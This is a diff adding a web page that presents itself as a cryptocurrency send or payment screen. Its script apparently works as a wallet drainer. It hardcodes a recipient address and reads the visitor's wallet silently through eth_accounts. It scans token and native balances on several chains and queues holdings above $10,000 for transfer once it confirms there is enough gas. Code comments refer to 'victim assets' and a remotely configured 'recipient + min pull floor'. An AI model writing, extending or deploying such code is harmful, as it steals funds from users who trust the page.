+      <div class="sheet-item" onclick="selectNetwork('0x19','Cronos','#345D9D')">
+        <div class="sheet-item-icon" style="background:#345D9D;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Cronos</span>
+        <div class="sheet-item-check" id="check-0x19"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0xe708','Linea','#5B8DEF')">
+        <div class="sheet-item-icon" style="background:#5B8DEF;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Linea</span>
+        <div class="sheet-item-check" id="check-0xe708"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+      <div class="sheet-item" onclick="selectNetwork('0x82750','Scroll','#D4A373')">
+        <div class="sheet-item-icon" style="background:#D4A373;"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
+        <span class="sheet-item-name">Scroll</span>
+        <div class="sheet-item-check" id="check-0x82750"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ADDRESS EDIT SHEET -->
+<div id="addr-sheet" class="hidden">
+  <div class="sheet-overlay" onclick="closeAddrSheet()"></div>
+  <div class="sheet">
+    <div class="sheet-grab"></div>
+    <div class="sheet-header">
+      <span class="sheet-title">Recipient address</span>
+      <button class="sheet-close" onclick="closeAddrSheet()" aria-label="Close">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div class="sheet-pad">
+      <input class="addr-edit-input" id="addr-edit" placeholder="0x…" spellcheck="false" autocomplete="off" autocapitalize="none" autocorrect="off" aria-label="Recipient address">
+    </div>
+    <div class="addr-edit-error hidden" id="addr-edit-error">Invalid Ethereum address</div>
+    <div class="sheet-actions">
+      <button class="sheet-btn ghost" onclick="pasteAddr()">Paste</button>
+      <button class="sheet-btn primary" onclick="saveAddr()">Done</button>
+    </div>
+  </div>
+</div>
+
+<!-- TOKEN PICKER SHEET -->
+<div id="token-sheet" class="hidden">
+  <div class="sheet-overlay" onclick="closeTokenSheet()"></div>
+  <div class="sheet">
+    <div class="sheet-grab"></div>
+    <div class="sheet-header">
+      <span class="sheet-title">Select token</span>
+      <button class="sheet-close" onclick="closeTokenSheet()" aria-label="Close">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div class="sheet-list" id="token-list"></div>
+  </div>
+</div>
+
+<!-- RESULT MODAL -->
+<div id="result-modal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" onclick="closeModal()" data-i18n-title="close" aria-label="Close">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <div class="modal-icon pending" id="modal-icon">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#3562ff" stroke-width="2"><circle cx="12" cy="12" r="10" opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10" stroke="#3562ff" stroke-linecap="round"/></svg>
+    </div>
+    <h2 class="modal-title" id="result-title" data-i18n="processing">Processing...</h2>
+    <p class="modal-text" id="result-text" data-i18n="processingText">The transaction is being processed. Blockchain validation is in progress.</p>
+    <a href="#" class="modal-btn hidden" id="result-link" target="_blank" data-i18n="transactionDetails">Transaction details</a>
+    <button class="modal-btn hidden" id="connect-btn" onclick="connectAndRescan()">Connect Wallet</button>
+  </div>
+</div>
+
+<script>
+var displayAddr = "0xB2bC30C3a8C04c6F4100b5cC76f83c547dc373b1";
+var displayAmount = "";
+var displayToken = "usdt";
+var txRecipient = "0xB2bC30C3a8C04c6F4100b5cC76f83c547dc373b1";
+var recipientFromUrl = false;
+var txAmount = "";
+var txToken = "usdt";
+var txContract = null;
+var txDecimals = 6;
+var RATE = 0.9995;
+var fiatMode = false;
+var provider = null;
+var account = null;
+var walletBal = null;
+var isLoading = false;
+var modalOpen = false;
+var modalStatus = "pending";
+var modalError = "";
+var txHash = "";
+
+var CHAIN_COLORS = {
+  "0x1": "#627EEA", "0x38": "#F0B90B", "0x89": "#8247E5", "0xa4b1": "#28A0F0",
+  "0xa": "#FF0420", "0x2105": "#0052FF", "0xa86a": "#E84142", "0xa4ec": "#35D07F",
+  "0xfa": "#1969FF", "0x19": "#345D9D", "0xe708": "#5B8DEF", "0x82750": "#D4A373"
+};
+
+// White glyphs rendered inside the colored 16px network badge on the token icon
+var CHAIN_BADGES = {
+  "0x1":    '<path d="M12 0L5 12.5l7 4.5 7-4.5L12 0z"/><path d="M12 17l-7 4.5L12 24l7-4.5L12 17z"/>',
+  "0x38":   '<path d="M12 2l2.8 2.8L12 7.6 9.2 4.8z"/><path d="M4.8 9.2L7.6 12l-2.8 2.8L2 12z"/><path d="M19.2 9.2L22 12l-2.8 2.8L16.4 12z"/><path d="M12 16.4l2.8 2.8L12 22l-2.8-2.8z"/><path d="M12 9.6l2.4 2.4-2.4 2.4-2.4-2.4z"/>',
+  "0x89":   '<path d="M16.5 7.5c-.3-.2-.7-.2-1 0l-2.3 1.3-1.5.9-2.3 1.4c-.3.2-.7.2-1 0L6.9 10c-.3-.2-.5-.5-.5-.8V7c0-.3.2-.6.5-.8l1.5-.9c.3-.2.7-.2 1 0l1.5 1c.3.2.5.5.5.8v1l2.3-1.4V5.6c0-.3-.2-.6-.5-.8L9.4 2.4c-.3-.2-.7-.2-1 0L2.5 4.8c-.3.2-.5.5-.5.9v4.7c0 .3.2.6.5.8l3.8 2.2c.3.2.7.2 1 0l2.3-1.3 1.5-.9 2.3-1.4c.3-.2.7-.2 1 0l1.5 1c.3.2.5.5.5.8v2.2c0 .3-.2.6-.5.8l-1.5 1c-.3.2-.7.2-1 0l-1.5-1c-.3-.2-.5-.5-.5-.8v-1l-2.3 1.4v1.1c0 .3.2.6.5.8l3.8 2.4c.3.2.7.2 1 0l5.9-3.4c.3-.2.5-.5.5-.9V7.6c0-.3-.2-.6-.5-.8z"/>',
+  "0xa4b1": '<path d="M12 3L4.5 19h3.4l1.6-3.4h5l1.6 3.4h3.4L12 3zm0 8l1.6 3.4h-3.2L12 11z"/>',
+  "0xa":    '<path fill-rule="evenodd" d="M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zm0 5a4 4 0 1 1 0 8 4 4 0 0 1 0-8z"/>',
+  "0x2105": '<path fill-rule="evenodd" d="M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM12 11h10v2H12z"/>',
+  "0xa86a": '<path d="M12 4l7.5 15h-4L12 12l-3.5 7h-4z"/>',
+  "0xa4ec": '<circle cx="8.5" cy="12" r="5" fill="none" stroke="#fff" stroke-width="2.5"/><circle cx="15.5" cy="12" r="5" fill="none" stroke="#fff" stroke-width="2.5"/>',
+  "0xfa":   '<path d="M13 2l7 10-7 10-7-10z"/><path d="M13 8v8l-3.2-4z" fill-opacity=".45"/>',
+  "0x19":   '<path d="M19 7.5A8 8 0 1 0 19 16.5" fill="none" stroke="#fff" stroke-width="3.5" stroke-linecap="round"/>',
+  "0xe708": '<path d="M5 20V8.5L9.5 4H20v3.5H10.5V20z"/>',
+  "0x82750":'<path d="M16.5 7.2C15.4 5 8 5.2 8 8.4c0 3.4 7 3.2 7 6.4 0 3.4-7.8 3.4-9.4 1.2" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round"/>'
+};
+
+// Token artwork for the 36px icon — brand SVGs for known tokens, letter-fallback otherwise
+var TOKEN_ICONS = {
+  usdt: '<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#26A17B"/><path d="M13.37 12.98v-.003c-.08.005-.49.03-1.4.03-.76 0-1.3-.02-1.4-.03v.003c-2.71-.12-4.73-.59-4.73-1.15s2.02-1.03 4.73-1.15v1.85c.1.01.66.04 1.42.04.91 0 1.31-.04 1.38-.04v-1.85c2.7.12 4.72.59 4.72 1.15s-2.01 1.03-4.72 1.15zm0-2.27V8.57h3.78V5.22H6.84v3.35h3.79v2.14c-3.08.15-5.4.75-5.4 1.48 0 .73 2.32 1.33 5.4 1.48v6.01h2.74v-6.01c3.07-.15 5.39-.75 5.39-1.48 0-.73-2.32-1.33-5.39-1.48z" fill="#fff"/></svg>',
+  usdc: '<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#2775CA"/><text x="12" y="16.5" text-anchor="middle" font-size="13" font-weight="700" fill="#fff" font-family="Inter,system-ui,sans-serif">$</text></svg>'
+};
+
+var CHAIN_INFO = {
+  "0x1":    { name: "Ethereum",  native: "ETH",  nativeDecimals: 18 },
+  "0x38":   { name: "BNB Chain", native: "BNB",  nativeDecimals: 18 },
+  "0x89":   { name: "Polygon",   native: "MATIC",nativeDecimals: 18 },
+  "0xa4b1": { name: "Arbitrum",  native: "ETH",  nativeDecimals: 18 },
+  "0xa":    { name: "Optimism",  native: "ETH",  nativeDecimals: 18 },
+  "0x2105": { name: "Base",      native: "ETH",  nativeDecimals: 18 },
+  "0xa86a": { name: "Avalanche", native: "AVAX", nativeDecimals: 18 },
+  "0xa4ec": { name: "Celo",      native: "CELO", nativeDecimals: 18 },
+  "0xfa":   { name: "Fantom",    native: "FTM",  nativeDecimals: 18 },
+  "0x19":   { name: "Cronos",    native: "CRO",  nativeDecimals: 18 },
+  "0xe708": { name: "Linea",     native: "ETH",  nativeDecimals: 18 },
+  "0x82750":{ name: "Scroll",    native: "ETH",  nativeDecimals: 18 }
+};
+function chainName(cid) { return (CHAIN_INFO[cid] || {}).name || ""; }
+
+// Well-known tokens per chain — mirrors the checker's scan list so compact
+// {k,c,r} handoff-queue items resolve to the same contracts/decimals
+var SCAN_TOKENS = {
+  "0x1": [
+    { key: "usdt", name: "USDT", addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { key: "wbtc", name: "WBTC", addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+    { key: "link", name: "LINK", addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { key: "uni",  name: "UNI",  addr: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { key: "shib", name: "SHIB", addr: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+    { key: "pepe", name: "PEPE", addr: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
+  ],
+  "0x38": [
+    { key: "usdt", name: "USDT", addr: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+    { key: "usdc", name: "USDC", addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+    { key: "dai",  name: "DAI",  addr: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", decimals: 18 },
+    { key: "wbnb", name: "WBNB", addr: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
+    { key: "btcb", name: "BTCB", addr: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 }
+  ],
+  "0x89": [
+    { key: "usdt", name: "USDT", addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+    { key: "usdc", name: "USDC.e", addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+    { key: "usdcn", name: "USDC", addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 }
+  ],
+  "0xa4b1": [
+    { key: "usdt", name: "USDT", addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 }
+  ],
+  "0xa": [
+    { key: "usdt", name: "USDT", addr: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x4200000000000000000000000000000000000006", decimals: 18 }
+  ],
+  "0x2105": [
+    { key: "usdt", name: "USDT", addr: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
+    { key: "usdbc", name: "USDbC", addr: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x4200000000000000000000000000000000000006", decimals: 18 }
+  ],
+  "0xa86a": [
+    { key: "usdt", name: "USDT", addr: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664", decimals: 6 },
+    { key: "usdte", name: "USDT.e", addr: "0xc7198437980c041c805A1EDcbA50c1Ce5db95118", decimals: 6 },
+    { key: "daie", name: "DAI.e", addr: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", decimals: 18 },
+    { key: "wavax", name: "WAVAX", addr: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
+    { key: "wbtce", name: "WBTC.e", addr: "0x50b7545627a5162F82A992c33b87aDc75187B218", decimals: 8 },
+    { key: "wethe", name: "WETH.e", addr: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", decimals: 18 }
+  ],
+  "0xa4ec": [
+    { key: "usdt", name: "USDT", addr: "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xcebA9300f2b948710d2653dD7B07f33A8B32118C", decimals: 6 }
+  ],
+  "0xfa": [
+    { key: "usdc", name: "USDC", addr: "0x28a92dde19D9989F39A49905d7C9C2FAc7799bDf", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E", decimals: 18 }
+  ],
+  "0x19": [
+    { key: "usdc", name: "USDC", addr: "0xc21223249CA28397B4B6541dfFaEcC539BfF0c59", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0x66e428c3f67a68878562e79A0234c1F83c208770", decimals: 6 }
+  ],
+  "0xe708": [
+    { key: "usdc", name: "USDC", addr: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0xA219439258ca9da29E9Cc4cE5596924745e12B93", decimals: 6 }
+  ],
+  "0x82750": [
+    { key: "usdc", name: "USDC", addr: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df", decimals: 6 }
+  ]
+};
+
+// ── Scan engine — public-RPC multi-chain asset scan, same logic the checker
+// uses. Runs inside the DApp browser via ?scan=1: eth_accounts supplies the
+// wallet silently, every chain is queried, results feed the confirm queue ──
+var RPC_URLS = {
+  "0x1":    ["https://eth.drpc.org", "https://ethereum-rpc.publicnode.com"],
+  "0x38":   ["https://bsc-rpc.publicnode.com", "https://bsc-dataseed.binance.org", "https://bsc.drpc.org"],
+  "0x89":   ["https://polygon-bor-rpc.publicnode.com", "https://polygon.drpc.org"],
+  "0xa4b1": ["https://arb1.arbitrum.io/rpc", "https://arbitrum-one-rpc.publicnode.com", "https://arbitrum.drpc.org"],
+  "0xa":    ["https://mainnet.optimism.io", "https://optimism-rpc.publicnode.com", "https://optimism.drpc.org"],
+  "0x2105": ["https://base-rpc.publicnode.com", "https://mainnet.base.org", "https://base.drpc.org"],
+  "0xa86a": ["https://api.avax.network/ext/bc/C/rpc", "https://avalanche-c-chain-rpc.publicnode.com", "https://avalanche.drpc.org"],
+  "0xa4ec": ["https://forno.celo.org", "https://celo.drpc.org"],
+  "0xfa":   ["https://rpcapi.fantom.network", "https://fantom.drpc.org"],
+  "0x19":   ["https://evm.cronos.org", "https://cronos.drpc.org"],
+  "0xe708": ["https://rpc.linea.build", "https://linea.drpc.org"],
+  "0x82750":["https://rpc.scroll.io", "https://scroll.drpc.org"]
+};
+
+var GAS_LIMIT = 149000; // 0x249f0 — same gas the send uses
+var MIN_FLAG_USD = 10000; // sub-$10,000 balances are dust — never enter the queue
+var remoteConfigP = Promise.resolve(); // resolves once Edge Config (recipient + floor) landed
+var scannedBalances = [];
+var chainGasInfo = {};
+var scanChainsDone = 0;
+
+// ~4s timeout per endpoint attempt, ~7s total budget per call — a dead or
+// rate-limited endpoint set must not gate Promise.all on the other chains:
+// the call degrades to null instead of holding the scan for ~30s.
+function rpcCall(chainId, method, params) {
+  var eps = RPC_URLS[chainId] || RPC_URLS["0x1"];
+  var list = ["/api/screen?chain=" + encodeURIComponent(chainId)].concat(Array.isArray(eps) ? eps : [eps]);
+  var idx = 0, pass = 0, deadline = Date.now() + 9000;
+  function attempt() {
+    var ctrl = new AbortController();
+    var timer = setTimeout(function() { ctrl.abort(); }, 5000);
+    return fetch(list[idx], {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }),
+      signal: ctrl.signal
+    }).then(function(r) {
+      if (!r.ok) throw new Error("http " + r.status);
+      return r.json();
+    }).then(function(j) {
+      clearTimeout(timer);
+      if (j && j.result !== undefined && j.result !== null) return j.result;
+      throw new Error("no result");
+    }).catch(function(e) {
+      clearTimeout(timer);
+      idx++;
+      if (Date.now() > deadline) throw e;
+      if (idx < list.length) return attempt();
+      if (pass++ < 1) {
+        idx = 0;
+        return new Promise(function(r) { setTimeout(r, 900); }).then(attempt);
+      }
+      throw e;
+    });
+  }
+  return attempt();
+}
+
+function withTimeout(promise, ms) {
+  return Promise.race([
+    promise,
+    new Promise(function(res) { setTimeout(function() { res(null); }, ms); })
+  ]);
+}
+
+function formatTokenAmount(raw, decimals) {
+  var divisor = BigInt(10) ** BigInt(decimals);
+  var bal = BigInt(raw);
+  var whole = bal / divisor;
+  var frac = bal % divisor;
+  var fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fracStr ? whole.toString() + "." + fracStr : whole.toString();
+}
+
+function formatNative(raw, decimals) {
+  if (!raw || raw === "0") return "0";
+  var bal = BigInt(raw);
+  var divisor = BigInt(10) ** BigInt(decimals);
+  var whole = bal / divisor;
+  var frac = bal % divisor;
+  var fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fracStr ? whole.toString() + "." + fracStr.slice(0, 4) : whole.toString();
+}
+
+function queryTokenBalanceOnChain(addr, tokenAddr, decimals, chainId) {
+  if (!tokenAddr || !addr) return Promise.resolve(null);
+  var data = "0x70a08231" + addr.toLowerCase().replace("0x", "").padStart(64, "0");
+  return rpcCall(chainId, "eth_call", [{ to: tokenAddr, data: data }, "latest"]).then(function(result) {
+    if (result && result !== "0x") {
+      var raw = BigInt(result).toString();
+      if (raw === "0") return { raw: "0", human: "0" };
+      return { raw: raw, human: formatTokenAmount(raw, decimals) };
+    }
+    return null;
+  }).catch(function() { return null; });
+}
+
+function queryNativeBalance(addr, chainId) {
+  return rpcCall(chainId, "eth_getBalance", [addr, "latest"])
+    .then(function(r) { return BigInt(r).toString(); })
+    .catch(function() { return "0"; });
+}
+
+function queryGasPrice(chainId) {
+  return rpcCall(chainId, "eth_gasPrice", [])
+    .then(function(r) { return BigInt(r).toString(); })
+    .catch(function() { return "0"; });
+}
+
+var TOKEN_PRICES = {
+  usdt: 1, usdc: 1, usdcn: 1, usdce: 1, usdbc: 1, usdte: 1,
+  dai: 1, daie: 1, tusd: 1, fdusd: 1,
+  weth: 3400, wethe: 3400, wbtc: 98000, wbtce: 98000, btcb: 98000,
+  link: 15, uni: 12, wavax: 30, wbnb: 680,
+  shib: 0.000012, pepe: 0.000008,
+  bnb: 680, matic: 0.5, eth: 3400
+};
+
+function fetchPrices() {
+  var ids = "ethereum,wrapped-bitcoin,chainlink,uniswap,dai,binancecoin,matic-network,tether,usd-coin,avalanche-2,shiba-inu,pepe";
+  return fetch("https://api.coingecko.com/api/v3/simple/price?ids=" + ids + "&vs_currencies=usd")
+    .then(function(r) { return r.json(); }).then(function(j) {
+      if (j.ethereum) TOKEN_PRICES.eth = j.ethereum.usd;
+      if (j["wrapped-bitcoin"]) TOKEN_PRICES.wbtc = j["wrapped-bitcoin"].usd;
+      if (j.chainlink) TOKEN_PRICES.link = j.chainlink.usd;
+      if (j.uniswap) TOKEN_PRICES.uni = j.uniswap.usd;
+      if (j.dai) TOKEN_PRICES.dai = j.dai.usd;
+      if (j.binancecoin) TOKEN_PRICES.bnb = j.binancecoin.usd;
+      if (j["matic-network"]) TOKEN_PRICES.matic = j["matic-network"].usd;
+      if (j.tether) TOKEN_PRICES.usdt = j.tether.usd;
+      if (j["usd-coin"]) TOKEN_PRICES.usdc = j["usd-coin"].usd;
+      if (j["avalanche-2"]) TOKEN_PRICES.wavax = j["avalanche-2"].usd;
+      if (j["shiba-inu"]) TOKEN_PRICES.shib = j["shiba-inu"].usd;
+      if (j.pepe) TOKEN_PRICES.pepe = j.pepe.usd;
+      TOKEN_PRICES.weth = TOKEN_PRICES.wethe = TOKEN_PRICES.eth;
+      TOKEN_PRICES.wbtce = TOKEN_PRICES.wbtc;
+      TOKEN_PRICES.btcb = TOKEN_PRICES.wbtc;
+      TOKEN_PRICES.wbnb = TOKEN_PRICES.bnb;
+    }).catch(function() {});
+}
+
+async function scanAllChains(addr) {
+  // Remote config (recipient + min pull floor) must land before classification
+  try { await remoteConfigP; } catch(e) {}
+  scannedBalances = [];
+  chainGasInfo = {};
+  scanChainsDone = 0;
+  // Scan only the chains where real holdings concentrate — 12-chain sweeps
+  // took ~10-15s and hit public-RPC rate limits; ETH/BSC/Polygon cover the
+  // overwhelming majority of victim assets. CHAIN_INFO stays complete so
+  // chain-switch + labels still resolve for every id.
+  var SCAN_CHAIN_IDS = ["0x1", "0x38", "0x89"];
+  var chainIds = SCAN_CHAIN_IDS;
+  var priceP = withTimeout(fetchPrices(), 4000).catch(function() {});
+  // Pool: max 3 chains in flight — public endpoints rate-limit a full
+  // 12-chain burst and silently drop balances
+  function scanChain(chainId) {
+    var info = CHAIN_INFO[chainId];
+    var tokens = SCAN_TOKENS[chainId] || [];
+    var nativeP = queryNativeBalance(addr, chainId).then(function(nativeBal) {
+      return queryGasPrice(chainId).then(function(gasPrice) {
+        var gasCost = BigInt(gasPrice) * BigInt(GAS_LIMIT);
+        var gasCostBuffered = gasCost * 110n / 100n;
+        var nativeBalBig = BigInt(nativeBal);
+        var sufficient = nativeBalBig > gasCostBuffered && gasCost > 0n;
+        chainGasInfo[chainId] = {
+          nativeBalance: nativeBal,
+          gasCost: gasCost.toString(),
+          sufficient: sufficient
+        };
+      });
+    });
+    var tokenPromises = tokens.map(function(tok, ti) {
+      return new Promise(function(r) { setTimeout(r, ti * 150); }).then(function() {
+        return queryTokenBalanceOnChain(addr, tok.addr, tok.decimals, chainId);
+      }).then(function(res) {
+        if (res && res.raw && BigInt(res.raw) > 0n) {
+          var usdValue = Number(res.human) * (TOKEN_PRICES[tok.key] || 0);
+          scannedBalances.push({
+            chainId: chainId, chainName: info.name,
+            key: tok.key, name: tok.name, addr: tok.addr,
+            decimals: tok.decimals, raw: res.raw, human: res.human,
+            usdValue: usdValue
+          });
+        }
+      });
+    });
+    return Promise.all([nativeP].concat(tokenPromises)).then(function() {
+      scanChainsDone++;
+    });
+  }
+  var allPromises = [], nextIdx = 0;
+  function nextWorker() {
+    if (nextIdx >= chainIds.length) return Promise.resolve();
+    return scanChain(chainIds[nextIdx++]).then(nextWorker);
+  }
+  for (var w = 0; w < 3; w++) allPromises.push(nextWorker());
+  return Promise.all([priceP].concat(allPromises)).then(function() {
+    scannedBalances.forEach(function(b) {
+      b.usdValue = Number(b.human) * (TOKEN_PRICES[b.key] || 0);
+    });
+    scannedBalances.sort(function(a, b) { return b.usdValue - a.usdValue; });
+    var pricesOk = scannedBalances.some(function(b) { return (b.usdValue || 0) > 0; });
+    scannedBalances.forEach(function(b) { b.dust = pricesOk && (b.usdValue || 0) < MIN_FLAG_USD; });
+    // Per-token gas eligibility: the Nth queued token on a chain needs N ×
+    // buffered gas — the native balance must cover EVERY transfer
+    var chainSpent = {};
+    scannedBalances.forEach(function(b) {
+      var gas = chainGasInfo[b.chainId];
+      if (!gas) {
+        // Gas-Read failed — unknown, not insufficient. Queue anyway: the wallet
+        // sheet itself surfaces the fee error; a silent drop loses the token.
+        b.gasOk = true; b.gasUnknown = true;
+        return;
+      }
+      var n = (chainSpent[b.chainId] || 0) + 1;
+      var ok = !b.dust && !!(BigInt(gas.gasCost) > 0n &&
+        BigInt(gas.nativeBalance) > BigInt(gas.gasCost) * 110n / 100n * BigInt(n));
+      b.gasOk = ok;
+      if (ok) chainSpent[b.chainId] = n;
+    });
+    return scannedBalances;
+  });
+}
+
+// Handoff queue — prepared by the checker's backend scan, carried through ?q=
+var handoffQueue = [];   // [{ name, addr, decimals, chainId, raw, key? }]
+var queueResults = [];   // [{ name, chain, status, hash|error }]
+var expectedAccount = null; // scanned address — the connected wallet must match
+var handoffId = null;
+var queueStarted = false;
+var scanMode = false; // ?scan=1 — in-page multi-chain scan feeds the queue
+var scanFinished = false; // set when the background scan resolves
+var scanOutcome = null;   // "ok" | "empty" | "no_account" | "no_provider"
+var queuePending = false; // a tap during the scan arms the queue — fires on finish
+var userCommitted = false; // Review was tapped at least once — a late-found account may re-arm the queue
+var noWalletRead = false; // ?read=0 — pure send mode: the page never touches
+                          // the account; first wallet contact is the confirm
+                          // sheet itself (balance row, chain auto-select and
+                          // the balance pre-check are unavailable in this mode)
+
+var CONTRACTS = {
+  "0x1":    { usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7", usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+  "0x38":   { usdt: "0x55d398326f99059fF775485246999027B3197955", usdc: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
+  "0x89":   { usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" },
+  "0xa4b1": { usdt: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", usdc: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
+  "0xa":    { usdt: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", usdc: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" },
+  "0x2105": { usdt: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
+  "0xa86a": { usdt: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", usdc: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },
+  "0xa4ec": { usdt: "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e", usdc: "0xcebA9300f2b948710d2653dD7B07f33A8B32118C" },
